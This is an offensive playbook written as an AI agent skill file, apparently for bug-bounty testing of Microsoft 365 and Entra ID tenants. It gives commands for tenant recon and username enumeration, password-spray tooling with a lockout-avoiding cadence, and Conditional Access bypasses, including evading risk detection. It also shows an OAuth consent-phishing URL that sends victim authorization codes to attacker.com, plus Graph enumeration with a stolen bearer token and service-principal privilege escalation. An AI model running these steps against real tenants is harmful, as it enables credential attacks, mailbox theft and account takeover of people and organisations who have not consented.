---
name: m365-entra-attack
description: M365 / Entra ID external attack — AADSTS error mapping, CA bypass, AAD Connect PHS misconfig, Graph enumeration.
keywords: [m365, microsoft 365, entra, azure ad, aad, aadsts, conditional access, ca bypass, aad connect, graph api, owa, autodiscover]
---

# m365-entra-attack

## When this skill loads

Triggers: "m365", "microsoft 365", "entra", "azure ad", "aadsts",
"conditional access", "owa", "outlook web", "autodiscover", "graph
api", "tenant".

## Phase 1 — tenant + identity recon

Tenant discovery from email/domain:

```bash
curl -s "https://login.microsoftonline.com/getuserrealm.srf?login=user@example.com&xml=1"
curl -s "https://login.microsoftonline.com/example.com/.well-known/openid-configuration" | jq
curl -s "https://login.microsoftonline.com/common/userrealm/user@example.com?api-version=2.1" | jq
```

Returns: `cloud_instance_name`, `tenant_id` (UUID), federation mode
(Managed = cloud-only / Federated = on-prem AD FS / passthrough).

Subdomain probe:

```
https://autodiscover.example.com/autodiscover/autodiscover.xml
https://lyncdiscover.example.com/
https://enterpriseregistration.example.com/
https://enterpriseenrollment.example.com/
https://sip.example.com/
https://mail.example.com/owa/
```

## Phase 2 — user enumeration

`oAuth2/v2.0/token` returns distinguishable AADSTS error codes for
existing vs non-existent users:

| AADSTS | Meaning |
|---|---|
| AADSTS50034 | User does not exist in tenant |
| AADSTS50053 | Account locked |
| AADSTS50055 | Password expired |
| AADSTS50056 | Invalid or null password |
| AADSTS50057 | Account disabled |
| AADSTS50058 | Sign-in session expired |
| AADSTS50076 | MFA required (valid creds) |
| AADSTS50079 | MFA registration required |
| AADSTS50126 | Invalid creds (user exists) |
| AADSTS50128 | Invalid domain |
| AADSTS50158 | External security challenge not satisfied (CA) |
| AADSTS53003 | Blocked by CA |
| AADSTS65001 | Consent missing |
| AADSTS70008 | Auth code expired |
| AADSTS90014 | Required field missing |

Tooling:

```bash
o365creeper.py -f users.txt -o results.txt   # AADSTS-based username enum
oauth2-spray.py --tenant example.onmicrosoft.com --users users.txt --passwords passwords.txt --rate 1/30s
```

## Phase 3 — password spray (with extreme caution)

Spray protocols (each handled by a different log path):

| Endpoint | Log location | Notes |
|---|---|---|
| `login.microsoftonline.com` (OAuth2 token) | AAD sign-in logs | most visible |
| Autodiscover (basic auth, where still enabled) | Exchange logs | bypass MFA when basic auth left on |
| ActiveSync (basic auth) | Exchange logs | same |
| EWS (`Exchange.asmx`) | Exchange logs | legacy |
| ADFS endpoint (federated tenants) | ADFS logs | on-prem |

**Critical**: 2026 default is Basic Auth disabled on M365 — but
hybrid tenants may have it on autodiscover/EWS. Always check first.

Spray cadence: 1 attempt / user / 30 min, max 3 passwords per user
per 24h. Above this trips Smart Lockout / CA risk policies.

## Phase 4 — conditional access bypass

CA policies you'll encounter and the known external bypasses:

| Policy | Bypass surface |
|---|---|
| Block legacy auth | Look for service principal still allowing legacy on certain protocols (POP/IMAP/SMTP AUTH) |
| Block based on geo | VPN to whitelisted geo; or use compromised SP that has CA exclusion |
| Block based on device compliance | Use a "Windows" user-agent + claim to be a managed device via WAM token — works only with creds + Intune cert (uncommon for ext) |
| MFA required for all users | Look for excluded "break-glass" admin account — those exist by design |
| Block from non-corporate IP | Web-app proxy that fronts SaaS may be in scope |
| Risk-based (P2) | Bypass risk by avoiding patterns: no impossible travel, no anonymous IP, low-risk UA |

Important: never disable CA; always work within it. CA exclusion
enumeration via `AzureHound` requires AAD read perms.

## Phase 5 — AAD Connect PHS misconfig

AAD Connect's password-hash-sync (PHS) account is named
`MSOL_<random>` in on-prem AD. If the on-prem AD is compromised
through *any* path (separate engagement scope!), the MSOL account
DCsync-replicates and lets attacker dump all on-prem hashes which
sync to cloud → cloud takeover.

External-only relevance: detect PHS vs Pass-Through Auth (PTA) via
the `userrealm.srf` output's `NameSpaceType`. PHS = sync; PTA =
on-prem decides. Both bad for different reasons.

## Phase 6 — token theft via OAuth consent phishing

Register an attacker-tenant app with permissions:

- `Mail.Read`, `Files.Read.All`, `User.Read.All`, `Group.Read.All`
- Or worst-case `offline_access` for refresh-token persistence

Send victim a consent URL:

```
https://login.microsoftonline.com/common/oauth2/v2.0/authorize
  ?client_id=<attacker-app-uuid>
  &response_type=code
  &redirect_uri=https://attacker.com/cb
  &scope=offline_access+Mail.Read+Files.Read.All
  &state=...
```

If tenant has not restricted user consent, click-through =
attacker reads victim mailbox.

Mitigation check: `Az AD External ID > User consent settings` — if
"Users can consent to apps from verified publishers", attacker
needs verified publisher (cheap to obtain).

## Phase 7 — post-credential Graph API enumeration

With a single legit token (read-only):

```bash
GRAPH=https://graph.microsoft.com/v1.0
TOKEN=<bearer>

curl -s "$GRAPH/me" -H "Authorization: Bearer $TOKEN" | jq
curl -s "$GRAPH/users?\$top=999" -H "Authorization: Bearer $TOKEN" | jq '.value[].userPrincipalName'
curl -s "$GRAPH/groups?\$top=999&\$filter=startswith(displayName,'Admin')" -H "Authorization: Bearer $TOKEN"
curl -s "$GRAPH/applications" -H "Authorization: Bearer $TOKEN"
curl -s "$GRAPH/servicePrincipals?\$filter=appRoleAssignmentRequired eq false" -H "Authorization: Bearer $TOKEN"
curl -s "$GRAPH/directoryRoles" -H "Authorization: Bearer $TOKEN"
curl -s "$GRAPH/devices" -H "Authorization: Bearer $TOKEN"
curl -s "$GRAPH/me/transitiveMemberOf" -H "Authorization: Bearer $TOKEN"
```

Tooling: `roadtools`, `azurehound`, `aadinternals` (PowerShell).

## Phase 8 — Service Principal abuse

Look for SPs with:
- Owner = group containing low-privileged users
- `appRoleAssignmentRequired = false`
- Excessive Graph permissions (`Directory.ReadWrite.All`, `RoleManagement.ReadWrite.Directory`)

A low-priv user owning an over-scoped SP can mint client credentials
and act as the SP → privilege escalation.

## Disclosed CVE / advisory matrix (curated)

| CVE / advisory | Year | Title |
|---|---|---|
| CVE-2021-26855 (ProxyLogon) | 2021 | Exchange SSRF pre-auth |
| CVE-2021-34473 (ProxyShell) | 2021 | Exchange path confusion + RCE |
| CVE-2022-41040 (ProxyNotShell) | 2022 | Exchange SSRF |
| CVE-2023-21709 | 2023 | Exchange password-spray amplifier |
| CVE-2023-23397 | 2023 | Outlook NTLM leak via calendar invite |
| MSRC nOAuth | 2023 | Email-claim trusted without verified flag |
| CVE-2024-21413 (MonikerLink) | 2024 | Outlook NTLM hash via link |
| Midnight Blizzard / Storm-0558 (2023) | 2023 | Signing-key theft → cross-tenant token forgery |

## Never-submit fallbacks

- AADSTS error enum alone → DOWNGRADE (info-only on most programs)
- Tenant ID disclosure → KILL (public via `.well-known/`)
- "Basic auth enabled on autodiscover" alone → DOWNGRADE unless you
  spray and prove ATO

## See also

- `okta-attack` — common SSO companion
- `hunt-oauth`, `hunt-jwt` — token-level attacks
- `exchange-attack` — on-prem Exchange specifics
